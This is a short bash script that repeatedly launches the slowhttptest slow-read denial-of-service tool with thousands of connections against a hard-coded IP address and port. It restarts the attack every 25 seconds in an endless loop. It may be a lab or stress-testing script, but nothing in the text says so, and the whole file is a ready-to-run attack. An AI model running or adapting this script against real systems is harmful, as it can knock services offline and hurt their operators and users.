#!/bin/bash

#cmd=$1
#t=$2

while true; do
  slowhttptest -c 4090 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://150.165.202.168:8081 -p 5 -l 7200 &
  #pid=$!
  pid=`/bin/ps -fu $USER| grep "slowhttptest" | grep -v "grep" | awk '{print $2}'`
  echo "pid: $pid"
  sleep 25
  killall -s SIGTERM slowhttptest
  #kill -15 $pid
done
